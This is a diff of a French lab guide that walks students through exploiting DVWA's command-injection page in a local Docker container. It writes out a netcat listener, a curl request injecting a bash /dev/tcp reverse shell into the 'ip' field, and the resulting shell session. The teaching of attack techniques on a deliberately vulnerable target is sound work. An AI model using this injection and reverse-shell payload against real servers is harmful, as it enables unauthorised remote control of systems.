@@ -930,70 +930,120 @@ curl -s -b /tmp/dvwa_cookie.txt \
 
 > 💡 **Pourquoi un reverse shell et pas juste `; whoami` ?** Avec `; whoami`, on exécute une commande à la fois, et on voit le résultat dans la page web. Avec un reverse shell, on a un terminal complet : on peut enchaîner des commandes, naviguer, éditer des fichiers, lancer d'autres outils. C'est bien plus puissant.
 
-**Où ?** Terminal 1 (écouteur) ET Terminal 2 (injection)
+**Concept :**
+- **Kali** = cliente (écoute sur un port)
+- **DVWA** = serveur (se connecte à Kali)
+- Le **payload** injecté dans le champ `ip` dit au serveur : « connecte-toi à l'adresse `IP_KALI:PORT` et donne-moi un shell »
 
-**Actions :**
-1. **Terminal 1 :** Lancer netcat en écoute sur le port 4444 (À FAIRE **AVANT** l'injection)
-2. **Terminal 2 :** Trouver l'IP de l'hôte Kali sur le réseau Docker
-3. **Terminal 2 :** Injecter le payload reverse shell qui se connecte à notre écouteur
+```
+┌─────────┐    curl injecte payload     ┌──────────┐
+│  Kali   │ ──────────────────────────→ │  DVWA    │
+│ nc -lvnp│ ←───── TCP connect ─────── │ (bash)   │
+│  4444   │    (reverse shell)          │          │
+└─────────┘                             └──────────┘
+```
 
-> ⚠️ **Ordre impératif :** L'écouteur (nc) doit être lancé **AVANT** le payload. Sinon le serveur tente de se connecter sur le port 4444, personne n'écoute → connexion refusée → échec.
+**Où ?** Deux terminaux :
 
-**Commande :**
+| Terminal | Rôle |
+|----------|------|
+| Terminal 1 | **Écouteur** — attend la connexion du serveur (`nc -lvnp 4444`) |
+| Terminal 2 | **Injection** — envoie le payload avec `curl` |
 
-*Terminal 1 — écouteur netcat :*
+**Prérequis :** Le cookie de session DVWA doit être valide. Si vous ne l'avez pas :
+```bash
+source env.sh        # depuis la racine du repo
+bash labs_resolution/jour-01/setup_dvwa.sh
+```
+Ceci crée `/tmp/dvwa_cookie.txt` avec le cookie de session et passe le niveau en `low`.
+
+---
+
+**Terminal 1** — Lancer l'écouteur netcat (À FAIRE **AVANT** l'injection) :
+
 ```bash
 nc -lvnp 4444
-# -l  = listen (mode écoute)
-# -v  = verbose (affiche les connexions entrantes)
-# -n  = pas de DNS (ne pas résoudre les noms d'hôtes)
-# -p  = port (le port à écouter)
-# → Listening on 0.0.0.0:4444
 ```
-Laissez ce terminal ouvert — il attend une connexion.
+```
+Listening on 0.0.0.0:4444
+```
+Ne fermez pas ce terminal — il attend la connexion.
 
-*Terminal 2 — trouver l'IP Kali sur le réseau Docker :*
+> ⚠️ Si netcat refuse le port, un autre processus l'utilise déjà. Changez le port (ex: `4445`) dans les deux commandes (nc ET curl).
+
+---
+
+**Terminal 2** — Trouver l'IP de Kali sur le réseau Docker :
+
+L'interface `docker0` est le pont réseau entre Kali et ses conteneurs. Le conteneur DVWA verra Kali à cette adresse.
+
 ```bash
 ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
 # → 172.17.0.1
 ```
 
-> 💡 **`docker0` (172.17.0.1) — l'IP de Kali vue par le conteneur.**  
-> Docker crée sur Kali une interface virtuelle nommée `docker0`. Le conteneur DVWA l'utilise comme **passerelle (gateway)** pour joindre l'extérieur. Quand le conteneur se connecte à `172.17.0.1:4444`, il arrive sur Kali (là où tourne netcat).  
-> Si `docker0` n'existe pas (Docker rootless), utilisez `hostname -I | awk '{print $1}'` pour trouver l'IP de Kali sur le réseau local.
-
-Stockez cette IP dans une variable — vous allez l'utiliser dans le payload :
-
+Si la commande échoue (`docker0` introuvable), Kali est probablement en Docker rootless. Utilisez alors :
 ```bash
-KALI_IP=172.17.0.1   # ← remplacez si votre IP est différente
+hostname -I | awk '{print $1}'
 ```
 
-*Terminal 2 — injecter le reverse shell (curl) :*
+> 💡 **Pourquoi `172.17.0.1` ?** Docker crée un réseau privé `172.17.0.0/16`. L'hôte (Kali) est `172.17.0.1` (la passerelle), les conteneurs reçoivent des IP dans ce réseau (`172.17.0.2`, `172.17.0.3`, etc.). Ici le conteneur DVWA a reçu `172.18.0.5` (via `docker-compose`), mais il voit toujours sa passerelle sur `172.17.0.1`.
 
-Le payload contient l'IP de l'écouteur (Kali). On utilise `--data-urlencode` pour que les caractères spéciaux (`;`, `&`, `>`) soient correctement encodés dans la requête HTTP :
+Vérifions que l'écouteur est bien prêt :
 
 ```bash
-SESSID=$(grep PHPSESSID /tmp/dvwa_cookie.txt | awk '{print $NF}')
+nc -z 127.0.0.1 4444 && echo "✅ Écouteur OK" || echo "❌ Lance d'abord nc -lvnp 4444"
+```
+Si c'est `❌`, retournez au Terminal 1 et lancez `nc -lvnp 4444` d'abord.
+
+---
+
+**Terminal 2** — Injecter le reverse shell :
+
+```bash
 curl -s -b /tmp/dvwa_cookie.txt \
-  --data-urlencode "ip=127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/$KALI_IP/4444 0>&1'" \
+  --data-urlencode "ip=127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'" \
   --data-urlencode "Submit=Submit" \
   "http://localhost:8088/vulnerabilities/exec/"
 ```
 
-**Résultat attendu — dans le Terminal 1 (netcat) :**
+> 🔄 Si votre IP docker0 n'est pas `172.17.0.1`, remplacez-la dans le payload ci-dessus.
+
+**Explication du payload ligne par ligne :**
+
+| Partie | Rôle |
+|--------|------|
+| `127.0.0.1;` | Exécute d'abord `ping -c 4 127.0.0.1` (normal, ne dérange pas) |
+| `bash -c '...'` | Lance un nouveau bash — le shell par défaut du conteneur (dash) ne supporte pas `/dev/tcp` |
+| `exec bash -i` | Remplace le processus par un bash interactif (le `exec` évite un processus zombie) |
+| `>& /dev/tcp/172.17.0.1/4444` | Redirige stdout et stderr vers la socket TCP (la sortie part vers netcat) |
+| `0>&1` | Redirige stdin depuis la même socket (les commandes tapées dans netcat arrivent dans bash) |
+
+**Comment curl envoie ça au serveur :** `--data-urlencode` transforme les caractères spéciaux (`;`, `>`, `&`) en format URL (`%3B`, `%3E`, `%26`). Le serveur reçoit une requête POST normale, sans que le `&` du payload ne soit interprété comme séparateur de paramètres.
+
+---
+
+**Résultat attendu — Terminal 1 (netcat) :**
+
 ```
-connect to [172.17.0.1] from (UNKNOWN) [172.18.0.5] ...
+connect to [172.17.0.1] from (UNKNOWN) [172.18.0.5] 35178
 ```
-| Adresse | Qui ? | Rôle |
-|---------|-------|------|
-| `172.17.0.1` | **Kali** (`docker0`) | C'est l'IP de Kali sur le réseau Docker. Le conteneur s'y connecte. |
-| `172.18.0.5` | **DVWA** (le conteneur) | C'est l'IP du conteneur. Netcat affiche **d'où vient** la connexion. |
+
+| Adresse | Qui ? | Pourquoi ? |
+|---------|-------|------------|
+| `172.17.0.1` | **Kali** — interface `docker0` | Le conteneur s'est connecté **à** cette IP : c'est la passerelle Docker |
+| `172.18.0.5` | **DVWA** — le conteneur | Netcat affiche **d'où vient** la connexion : l'IP du conteneur |
+
+Ensuite, le prompt du reverse shell apparaît (après 1-2 secondes) :
 ```
 bash: cannot set terminal process group (302): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@<hostname>:/var/www/html/vulnerabilities/exec$ █
 ```
-Le `$ █` (ou `# █`) est le **prompt du shell** — vous êtes **dans le serveur**. Tapez des commandes :
+
+> ⚠️ **Si rien ne s'affiche dans netcat :** attendez 2 secondes et tapez `whoami` puis Entrée. Le prompt ne s'affiche pas toujours immédiatement, mais les commandes fonctionnent.
+
+**Vous êtes dans le serveur DVWA.** Tapez des commandes :
 
 | Commande | Réponse attendue |
 |----------|------------------|
@@ -1002,7 +1052,7 @@ Le `$ █` (ou `# █`) est le **prompt du shell** — vous êtes **dans le serv
 | `pwd` | `/var/www/html/vulnerabilities/exec` |
 | `ls -la /var/www/html/` | Liste des fichiers du site DVWA |
 
-> Les warnings `cannot set terminal process group` et `no job control` sont normaux : le reverse shell n'a pas de PTY (pseudo-terminal). Cela ne bloque pas l'exécution des commandes.
+> Les warnings `cannot set terminal process group` et `no job control` sont normaux : le reverse shell n'a pas de PTY (pseudo-terminal). Les commandes s'exécutent quand même.
 
 **Explication du payload `bash -c 'exec bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'` :**
 | Partie | Rôle |
